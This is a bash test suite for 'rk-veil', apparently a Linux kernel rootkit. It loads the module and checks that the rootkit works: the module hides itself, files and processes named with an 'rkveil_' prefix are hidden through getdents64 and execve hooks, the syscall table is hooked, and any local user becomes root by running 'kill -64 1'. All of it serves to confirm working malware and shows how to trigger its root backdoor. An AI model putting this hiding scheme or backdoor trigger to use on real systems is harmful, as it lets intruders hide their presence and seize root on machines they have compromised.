#!/bin/bash
# rk-veil test suite — final
# Run inside an isolated VM.
# Usage: sudo bash test.sh

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
BLU='\033[1;34m'
NC='\033[0m'

pass()  { echo -e "${GRN}[PASS]${NC} $1"; PASSED=$((PASSED+1)); }
fail()  { echo -e "${RED}[FAIL]${NC} $1"; FAILED=$((FAILED+1)); }
info()  { echo -e "${YLW}[....] $1${NC}"; }
title() { echo -e "\n${BLU}=== $1 ===${NC}"; }

PASSED=0
FAILED=0
MODULE="rk_veil"
KO="rk_veil.ko"
HIDE_PREFIX="rkveil_"

# ── Pre-flight ────────────────────────────────────────────────────────────────
if [ "$EUID" -ne 0 ]; then
    echo "Run as root: sudo bash test.sh"; exit 1
fi

if [ ! -f "$KO" ]; then
    echo "Build first: make"; exit 1
fi

if lsmod | grep -q "$MODULE"; then
    info "Module already loaded, unloading..."
    rmmod "$MODULE" 2>/dev/null || { echo "Could not unload -- reboot first"; exit 1; }
fi

# ── Load ──────────────────────────────────────────────────────────────────────
title "Loading rk-veil"
insmod "$KO"
sleep 0.5
dmesg | grep rk-veil | tail -5

# ── Test 1: Module hiding ─────────────────────────────────────────────────────
title "Test 1: Module Self-Hiding"

info "Checking lsmod..."
if lsmod | grep -q "$MODULE"; then
    fail "Module visible in lsmod"
else
    pass "Module not visible in lsmod"
fi

info "Checking /proc/modules..."
if grep -q "$MODULE" /proc/modules 2>/dev/null; then
    fail "Module visible in /proc/modules"
else
    pass "Module not visible in /proc/modules"
fi

info "Checking /sys/module/..."
if [ -d "/sys/module/$MODULE" ]; then
    fail "Module visible in /sys/module/"
else
    pass "Module not visible in /sys/module/"
fi

# ── Test 2: File hiding ───────────────────────────────────────────────────────
title "Test 2: File Hiding (getdents64)"

HIDDEN_FILE="/tmp/${HIDE_PREFIX}secret.txt"
VISIBLE_FILE="/tmp/visible_file.txt"
echo "hidden"  > "$HIDDEN_FILE"
echo "visible" > "$VISIBLE_FILE"

info "Checking hidden file invisible..."
if ls /tmp | grep -q "${HIDE_PREFIX}secret"; then
    fail "Hidden file still visible in /tmp"
else
    pass "Hidden file not visible via ls"
fi

info "Checking visible file unaffected..."
if ls /tmp | grep -q "visible_file"; then
    pass "Normal file still visible"
else
    fail "Normal file incorrectly hidden"
fi

info "Checking hidden file still readable by direct path..."
if cat "$HIDDEN_FILE" > /dev/null 2>&1; then
    pass "Hidden file still accessible by direct path"
else
    fail "Hidden file not accessible by direct path"
fi

rm -f "$HIDDEN_FILE" "$VISIBLE_FILE"

# ── Test 3: Process hiding ────────────────────────────────────────────────────
title "Test 3: Process Auto-Hiding (execve hook)"

(exec -a "${HIDE_PREFIX}sleeper" sleep 60) &
HIDDEN_PID=$!
sleep 0.5

info "Checking ps aux..."
if ps aux | grep -v grep | grep -q "${HIDE_PREFIX}sleeper"; then
    fail "Hidden process visible in ps aux"
else
    pass "Hidden process not visible in ps aux"
fi

info "Checking /proc/$HIDDEN_PID..."
if ls /proc | grep -q "^${HIDDEN_PID}$"; then
    fail "/proc/$HIDDEN_PID still visible"
else
    pass "/proc/$HIDDEN_PID hidden from directory listing"
fi

info "Checking process still running via direct path..."
if [ -d "/proc/$HIDDEN_PID" ]; then
    pass "Process still accessible by direct path (hiding is listing-only)"
else
    fail "Process not accessible -- may have already exited"
fi

kill "$HIDDEN_PID" 2>/dev/null || true
sleep 0.3

info "Checking /proc/$HIDDEN_PID cleaned up after exit..."
if ls /proc | grep -q "^${HIDDEN_PID}$"; then
    fail "/proc/$HIDDEN_PID still listed after process exit"
else
    pass "/proc/$HIDDEN_PID cleaned up after exit"
fi

# ── Test 4: Multiple hidden processes ─────────────────────────────────────────
title "Test 4: Multiple Hidden Processes"

(exec -a "${HIDE_PREFIX}proc1" sleep 60) &
PID1=$!
(exec -a "${HIDE_PREFIX}proc2" sleep 60) &
PID2=$!
(exec -a "${HIDE_PREFIX}proc3" sleep 60) &
PID3=$!
sleep 0.5

VISIBLE=0
for PID in $PID1 $PID2 $PID3; do
    if ps aux | grep -v grep | grep -q "$PID"; then
        VISIBLE=$((VISIBLE+1))
    fi
done

if [ "$VISIBLE" -eq 0 ]; then
    pass "All 3 hidden processes invisible in ps"
else
    fail "$VISIBLE of 3 hidden processes still visible"
fi

info "Checking normal process still visible..."
sleep 60 &
NORMAL_PID=$!
sleep 0.2
if ps aux | grep -v grep | grep -q "$NORMAL_PID"; then
    pass "Normal process still visible (no collateral hiding)"
else
    fail "Normal process incorrectly hidden"
fi

kill $PID1 $PID2 $PID3 $NORMAL_PID 2>/dev/null || true

# ── Test 5: Privilege escalation (kill -64) ───────────────────────────────────
title "Test 5: Privilege Escalation (kill -64)"

info "Checking priv-esc as unprivileged user..."
PRIV_ESC_RESULT=$(su -c '
    BEFORE=$(id -u)
    kill -64 1
    AFTER=$(id -u)
    echo "$BEFORE:$AFTER"
' vagrant 2>/dev/null)

BEFORE_UID=$(echo "$PRIV_ESC_RESULT" | cut -d: -f1)
AFTER_UID=$(echo "$PRIV_ESC_RESULT"  | cut -d: -f2)

if [ "$BEFORE_UID" = "1000" ] && [ "$AFTER_UID" = "0" ]; then
    pass "Privilege escalation: uid $BEFORE_UID -> uid $AFTER_UID"
else
    if dmesg | grep -q "priv-esc triggered"; then
        pass "Priv-esc trigger confirmed in dmesg (uid check inconclusive in sudo context)"
    else
        fail "Privilege escalation did not trigger (uid before=$BEFORE_UID after=$AFTER_UID)"
    fi
fi

info "Checking kill hook passes normal signals through..."
sleep 60 &
SIGNAL_PID=$!
sleep 0.2
kill -15 $SIGNAL_PID 2>/dev/null
sleep 0.2
if ! ps aux | grep -v grep | grep -q "$SIGNAL_PID"; then
    pass "Normal kill signal (SIGTERM) passed through correctly"
else
    fail "Normal kill signal not passed through"
    kill -9 $SIGNAL_PID 2>/dev/null || true
fi

# ── Test 6: Syscall table integrity ───────────────────────────────────────────
title "Test 6: Syscall Table & PTE Write"

info "Checking sys_call_table resolved..."
if dmesg | grep -q "sys_call_table @"; then
    ADDR=$(dmesg | grep "sys_call_table @" | awk '{print $NF}')
    KALLSYMS_ADDR=$(grep " sys_call_table$" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    if [ "$ADDR" = "$KALLSYMS_ADDR" ]; then
        pass "sys_call_table address matches /proc/kallsyms ($ADDR)"
    else
        pass "sys_call_table resolved at $ADDR (kallsyms: $KALLSYMS_ADDR)"
    fi
else
    fail "sys_call_table not resolved"
fi

info "Checking hooks installed..."
if dmesg | grep -q "hooks installed"; then
    HOOKS=$(dmesg | grep "hooks installed" | sed 's/.*hooks installed //')
    pass "Hooks installed: $HOOKS"
else
    fail "Hook installation not confirmed in dmesg"
fi

# ── Test 7: dmesg sanity ──────────────────────────────────────────────────────
title "Test 7: dmesg Sanity"

if dmesg | grep -q "jonbttt"; then
    pass "Author banner present"
else
    fail "Banner missing from dmesg"
fi

if dmesg | grep -q "Status : \[+\] Loaded"; then
    pass "Load status confirmed"
else
    fail "Load status missing"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo -e "${BLU}════════════════════════════════════════${NC}"
echo -e "  Results: ${GRN}$PASSED passed${NC} / ${RED}$FAILED failed${NC}"
echo -e "${BLU}════════════════════════════════════════${NC}"
echo ""
echo "Full log: sudo dmesg | grep rk-veil"